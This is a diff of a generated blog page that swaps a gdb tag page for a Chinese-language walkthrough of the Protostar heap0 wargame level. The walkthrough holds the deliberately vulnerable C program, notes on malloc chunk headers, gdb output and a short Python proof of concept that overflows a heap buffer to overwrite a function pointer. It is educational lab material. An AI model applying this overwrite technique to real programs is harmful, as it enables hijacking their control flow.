@@ -6,14 +6,27 @@
   <meta name="renderer" content="webkit">
   <meta http-equiv="X-UA-Compatible" content="IE=edge" >
   <link rel="dns-prefetch" href="https://github.com/NULL-ME/NULL-ME.github.io.git">
-  <title>Tag: gdb | 4chendy</title>
+  <title>Protostar-堆溢出系列学习-heap 0 | 4chendy</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta property="og:type" content="website">
-<meta property="og:title" content="4chendy">
-<meta property="og:url" content="https://github.com/NULL-ME/NULL-ME.github.io.git/tags/gdb/index.html">
+  <meta name="description" content="0x00 序学习了栈溢出相关的漏洞利用技巧，下面进入堆溢出相关。和栈溢出一样，从最简单的堆溢出开始，看看是如何利用堆溢出去控制程序的执行流程的。
+0x01 heap0C代码
+12345678910111213141516171819202122232425262728293031323334353637383940#include &amp;lt;stdlib.h&amp;gt;#include &amp;lt;unis">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Protostar-堆溢出系列学习-heap 0">
+<meta property="og:url" content="https://github.com/NULL-ME/NULL-ME.github.io.git/2017/04/10/Protostar-堆溢出系列学习-heap 0/Protostar-堆溢出系列学习-heap 0/index.html">
 <meta property="og:site_name" content="4chendy">
+<meta property="og:description" content="0x00 序学习了栈溢出相关的漏洞利用技巧，下面进入堆溢出相关。和栈溢出一样，从最简单的堆溢出开始，看看是如何利用堆溢出去控制程序的执行流程的。
+0x01 heap0C代码
+12345678910111213141516171819202122232425262728293031323334353637383940#include &amp;lt;stdlib.h&amp;gt;#include &amp;lt;unis">
+<meta property="og:image" content="https://github.com/NULL-ME/NULL-ME.github.io.git/NULL-ME/NULL-ME.github.io.git/2017/04/10/Protostar-堆溢出系列学习-heap 0/Protostar-堆溢出系列学习-heap 0/king/4chendyBlog/paper/stackBufferOverflow/Protostar-堆溢出系列学习-heap/ 0/0-0.png">
+<meta property="og:image" content="https://github.com/NULL-ME/NULL-ME.github.io.git/NULL-ME/NULL-ME.github.io.git/2017/04/10/Protostar-堆溢出系列学习-heap 0/Protostar-堆溢出系列学习-heap 0/king/4chendyBlog/paper/stackBufferOverflow/Protostar-堆溢出系列学习-heap/ 0/0-1.png">
+<meta property="og:updated_time" content="2017-04-20T13:49:00.000Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="4chendy">
+<meta name="twitter:title" content="Protostar-堆溢出系列学习-heap 0">
+<meta name="twitter:description" content="0x00 序学习了栈溢出相关的漏洞利用技巧，下面进入堆溢出相关。和栈溢出一样，从最简单的堆溢出开始，看看是如何利用堆溢出去控制程序的执行流程的。
+0x01 heap0C代码
+12345678910111213141516171819202122232425262728293031323334353637383940#include &amp;lt;stdlib.h&amp;gt;#include &amp;lt;unis">
+<meta name="twitter:image" content="https://github.com/NULL-ME/NULL-ME.github.io.git/NULL-ME/NULL-ME.github.io.git/2017/04/10/Protostar-堆溢出系列学习-heap 0/Protostar-堆溢出系列学习-heap 0/king/4chendyBlog/paper/stackBufferOverflow/Protostar-堆溢出系列学习-heap/ 0/0-0.png">
   
     <link rel="alternative" href="/atom.xml" title="4chendy" type="application/atom+xml">
   
@@ -52,11 +65,11 @@
 		<nav class="header-menu">
 			<ul>
 			
-				<li><a href="../../index.html">Home</a></li>
+				<li><a href="../../../../../index.html">Home</a></li>
 	        
-				<li><a href="../../archives">Archives</a></li>
+				<li><a href="../../../../../archives">Archives</a></li>
 	        
-				<li><a href="../../fuckshit">f**k-shit</a></li>
+				<li><a href="../../../../../fuckshit">f**k-shit</a></li>
 	        
 			</ul>
 		</nav>
@@ -136,11 +149,11 @@
 				<ul style="width: 70%">
 				
 				
-					<li style="width: 33.333333333333336%"><a href="../../index.html">Home</a></li>
+					<li style="width: 33.333333333333336%"><a href="../../../../../index.html">Home</a></li>
 		        
-					<li style="width: 33.333333333333336%"><a href="../../archives">Archives</a></li>
+					<li style="width: 33.333333333333336%"><a href="../../../../../archives">Archives</a></li>
 		        
-					<li style="width: 33.333333333333336%"><a href="../../fuckshit">f**k-shit</a></li>
+					<li style="width: 33.333333333333336%"><a href="../../../../../fuckshit">f**k-shit</a></li>
 		        
 				</ul>
 			</nav>
@@ -155,68 +168,214 @@
             <canvas data-colors="#eaeaea" data-sectionHeight="100" data-contentId="js-content" id="myCanvas1" class="anm-canvas"></canvas>
           </div>
           <div id="js-content" class="content-ll">
-            
-  
-  
+            <article id="post-Protostar-堆溢出系列学习-heap 0/Protostar-堆溢出系列学习-heap 0" class="article article-type-post " itemscope itemprop="blogPost">
+  <div class="article-inner">
     
-    
-      
-      
-      <section class="archives-wrap">
-        <div class="archive-year-wrap">
-          <a href="../../archives/2017" class="archive-year">2017</a>
-        </div>
-        <div class="archives">
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="../../2017/03/21/gdb常用调试命令总结/gdb/" class="archive-article-date">
-  	<time datetime="2017-03-21T03:06:59.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2017-03-21</time>
-</a>
-        </div>
-    	 
+      <header class="article-header">
+        
   
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="../../2017/03/21/gdb常用调试命令总结/gdb/">gdb常用调试命令总结</a>
+    <h1 class="article-title" itemprop="name">
+      Protostar-堆溢出系列学习-heap 0
     </h1>
   
 
-        <div class="article-info info-on-right">
-          
+        
+        <a href="" class="archive-article-date">
+  	<time datetime="2017-04-10T03:12:19.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2017-04-10</time>
+</a>
+        
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h2 id="0x00-序"><a href="#0x00-序" class="headerlink" title="0x00 序"></a>0x00 序</h2><p>学习了栈溢出相关的漏洞利用技巧，下面进入堆溢出相关。和栈溢出一样，从最简单的堆溢出开始，看看是如何利用堆溢出去控制程序的执行流程的。</p>
+<h2 id="0x01-heap0"><a href="#0x01-heap0" class="headerlink" title="0x01 heap0"></a>0x01 heap0</h2><p><code>C代码</code></p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></div><div class="line"></div><div class="line"><span class="keyword">struct</span> data &#123;</div><div class="line">  <span class="keyword">char</span> name[<span class="number">64</span>];</div><div class="line">&#125;;</div><div class="line"></div><div class="line"><span class="keyword">struct</span> fp &#123;</div><div class="line">  <span class="keyword">int</span> (*fp)();</div><div class="line">&#125;;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">winner</span><span class="params">()</span></span></div><div class="line">&#123;</div><div class="line">  <span class="built_in">printf</span>(<span class="string">"level passed\n"</span>);</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">nowinner</span><span class="params">()</span></span></div><div class="line">&#123;</div><div class="line">  <span class="built_in">printf</span>(<span class="string">"level has not been passed\n"</span>);</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> **argv)</span></span></div><div class="line">&#123;</div><div class="line">  <span class="keyword">struct</span> data *d;</div><div class="line">  <span class="keyword">struct</span> fp *f;</div><div class="line"></div><div class="line">  d = <span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="keyword">struct</span> data));</div><div class="line">  f = <span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="keyword">struct</span> fp));</div><div class="line">  f-&gt;fp = nowinner;</div><div class="line"></div><div class="line">  <span class="built_in">printf</span>(<span class="string">"data is at %p, fp is at %p\n"</span>, d, f);</div><div class="line"></div><div class="line">  <span class="built_in">strcpy</span>(d-&gt;name, argv[<span class="number">1</span>]);</div><div class="line">  </div><div class="line">  f-&gt;fp();</div><div class="line"></div><div class="line">&#125;</div></pre></td></tr></table></figure>
+<h2 id="0x02-简单分析-amp-思考"><a href="#0x02-简单分析-amp-思考" class="headerlink" title="0x02 简单分析&amp;思考"></a>0x02 简单分析&amp;思考</h2><p>先在堆上分配了一个data和fp的结构体，然后使fp指向<code>nowinner</code>函数，然后打印对应分配的堆地址，以及将<code>argv[1]</code>复制到data结构体，最后调用<code>nowinner</code>函数。</p>
+<p>可以知道我们需要去执行<code>winner</code>函数，怎么做到呢？</p>
+<p>由于<code>strcpy</code>没对数据长度进行检查，那我们是否可以利用堆溢出将fp结构体里面的函数指针改为<code>winner</code>函数？Here we go！</p>
+<h2 id="0x03-malloc"><a href="#0x03-malloc" class="headerlink" title="0x03 malloc()"></a>0x03 malloc()</h2><p>在继续分析之前，我们先来简单的介绍一下<code>malloc</code>函数，在这里<code>malloc</code>函数更多是对<code>mmap</code>系统调用函数的一个封装，为什么要封装呢？也就是为什么不直接调用<code>mmap</code>来进行堆分配，原因是为了方便堆的管理，简单的理解可以把堆看做一个很大的内存块。</p>
+<p>那是如何管理堆的呢？见下</p>
+<table>
+<thead>
+<tr>
+<th>堆标志</th>
+<th>分配大小</th>
+<th>malloc返回地址addr</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>00000000</td>
+<td>00000011</td>
+<td>00000000 00000000</td>
+</tr>
+<tr>
+<td>00000000</td>
+<td>00000031</td>
+<td>AAAAAAAA BBBBBBBB</td>
+</tr>
+<tr>
+<td>CCCCCCCC</td>
+<td>DDDDDDDD</td>
+<td>EEEEEEEE FFFFFFFF</td>
+</tr>
+<tr>
+<td>…</td>
+<td>…</td>
+<td>…       …</td>
+</tr>
+<tr>
+<td>00000000</td>
+<td>00000011</td>
+<td>00000000 00000000</td>
+</tr>
+</tbody>
+</table>
+<p>每次分配的时候会额外分配16字节的管理开销，来表示所分配堆的信息。比如可以通过<code>addr-4</code>拿到自身的分配大小从而决定下次分配的选择</p>
+<p><strong>注：分配大小的第一位表示前面的内存块是否在使用</strong></p>
+<h2 id="0x04-调试-amp-hack"><a href="#0x04-调试-amp-hack" class="headerlink" title="0x04 调试&amp;hack"></a>0x04 调试&amp;hack</h2><p>通过前面的分析，我们的目的很明确，需要通过<code>strcpy(d-&gt;name, argv[1]);</code>去重写fp结构体里面的函数指针，使其为<code>winner</code>函数的地址。</p>
+<p>1.利用gdb查看strcpy前后堆的情况<br><img src="/NULL-ME/NULL-ME.github.io.git/2017/04/10/Protostar-堆溢出系列学习-heap 0/Protostar-堆溢出系列学习-heap 0/king/4chendyBlog/paper/stackBufferOverflow/Protostar-堆溢出系列学习-heap/ 0/0-0.png" alt="0-0"><br>我们看到AAAABBBBCCC…分配到了data堆上，如果我们输入更长的数据，就可以将fp的<code>nowinner</code>地址改为<code>winner</code>地址</p>
+<p>2.查看<code>winner</code>地址，重写fp函数指针</p>
+<figure class="highlight actionscript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">(gdb) p winner </div><div class="line">$<span class="number">1</span> = &#123;<span class="keyword">void</span> (<span class="keyword">void</span>)&#125; <span class="number">0x8048464</span> &lt;winner&gt;</div></pre></td></tr></table></figure>
+<p>3.PoC Python脚本</p>
+<figure class="highlight golo"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> <span class="keyword">struct</span></div><div class="line">padding = <span class="string">"A"</span>*<span class="number">64</span> <span class="comment">#填充data</span></div><div class="line">head = <span class="string">"BBBB"</span>  <span class="comment"># not care</span></div><div class="line">head += <span class="string">"CCCC"</span> <span class="comment"># not care</span></div><div class="line">winner = <span class="keyword">struct</span>.pack(<span class="string">"I"</span>, <span class="number">0x8048464</span>) <span class="comment">#将nowinner地址改为winner地址</span></div><div class="line"><span class="keyword">print</span> padding+head+winner</div></pre></td></tr></table></figure>
+<p>4.hack<br><img src="/NULL-ME/NULL-ME.github.io.git/2017/04/10/Protostar-堆溢出系列学习-heap 0/Protostar-堆溢出系列学习-heap 0/king/4chendyBlog/paper/stackBufferOverflow/Protostar-堆溢出系列学习-heap/ 0/0-1.png" alt="0-1"><br>成功执行<code>winner</code>函数!</p>
+
+      
+
+      
+        <div class="page-reward">
+          <a href="javascript:;" class="page-reward-btn tooltip-top">
+            <div class="tooltip tooltip-east">
+            <span class="tooltip-item">
+              赏
+            </span>
+            <span class="tooltip-content">
+              <span class="tooltip-text">
+                <span class="tooltip-inner">
+                  <p class="reward-p"><i class="icon icon-quo-left"></i>感谢你的支持<i class="icon icon-quo-right"></i></p>
+                  <div class="reward-box">
+                    
+                    
+                    <div class="reward-box-item">
+                      <img class="reward-img" src="/uploads/weixin.jpg">
+                      <span class="reward-type">微信</span>
+                    </div>
+                    
+                  </div>
+                </span>
+              </span>
+            </span>
+          </div>
+          </a>
+        </div>
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
 	<div class="article-tag tagcloud">
 		<i class="icon-price-tags icon"></i>
 		<ul class="article-tag-list">
 			 
         		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">gdb</a>
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color1">Linux</a>
         		</li>
       		 
         		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color1">linux</a>
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">Protostar</a>
         		</li>
       		 
         		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color3">调试</a>
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">堆溢出</a>
         		</li>
       		
 		</ul>
 	</div>
 
-          
+      
 
+      
+
+      
+        
+<div class="share-btn share-icons tooltip-left">
+  <div class="tooltip tooltip-east">
+    <span class="tooltip-item">
+      <a href="javascript:;" class="share-sns share-outer">
+        <i class="icon icon-share"></i>
+      </a>
+    </span>
+    <span class="tooltip-content">
+      <div class="share-wrap">
+        <div class="share-icons">
+          <a class="weibo share-sns" href="javascript:;" data-type="weibo">
+            <i class="icon icon-weibo"></i>
+          </a>
+          <a class="weixin share-sns wxFab" href="javascript:;" data-type="weixin">
+            <i class="icon icon-weixin"></i>
+          </a>
+          <a class="qq share-sns" href="javascript:;" data-type="qq">
+            <i class="icon icon-qq"></i>
+          </a>
+          <a class="douban share-sns" href="javascript:;" data-type="douban">
+            <i class="icon icon-douban"></i>
+          </a>
+          <a class="qzone share-sns" href="javascript:;" data-type="qzone">
+            <i class="icon icon-qzone"></i>
+          </a>
+          <a class="facebook share-sns" href="javascript:;" data-type="facebook">
+            <i class="icon icon-facebook"></i>
+          </a>
+          <a class="twitter share-sns" href="javascript:;" data-type="twitter">
+            <i class="icon icon-twitter"></i>
+          </a>
+          <a class="google share-sns" href="javascript:;" data-type="google">
+            <i class="icon icon-google"></i>
+          </a>
         </div>
-        <div class="clearfix"></div>
-    </header>
+      </div>
+    </span>
+  </div>
+</div>
+
+<div class="page-modal wx-share js-wx-box">
+    <a class="close js-modal-close" href="javascript:;"><i class="icon icon-close"></i></a>
+    <p>扫一扫，分享到微信</p>
+    <div class="wx-qrcode">
+      <img src="http://s.jiathis.com/qrcode.php?url=https://github.com/NULL-ME/NULL-ME.github.io.git/2017/04/10/Protostar-堆溢出系列学习-heap 0/Protostar-堆溢出系列学习-heap 0/" alt="微信分享二维码">
+    </div>
+</div>
+
+<div class="mask js-mask"></div>
+      
+      <div class="clearfix"></div>
+    </div>
   </div>
 </article>
+
+  
+<nav id="article-nav">
   
   
-    </div></section>
+    <a href="../../mach-o动态链接/mach-o动态链接/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title">Mach-o动态链接</div>
+      <i class="icon-circle-right"></i>
+    </a>
+  
+</nav>
+
+
+
+
+
+
+  
+    <div class="duoshuo"></div>
   
 
-    
+
 
 
           </div>
@@ -239,9 +398,9 @@
 	var yiliaConfig = {
 		mathjax: false,
 		isHome: false,
-		isPost: false,
+		isPost: true,
 		isArchive: false,
-		isTag: true,
+		isTag: false,
 		isCategory: false,
 		open_in_new: false,
 		root: "/",
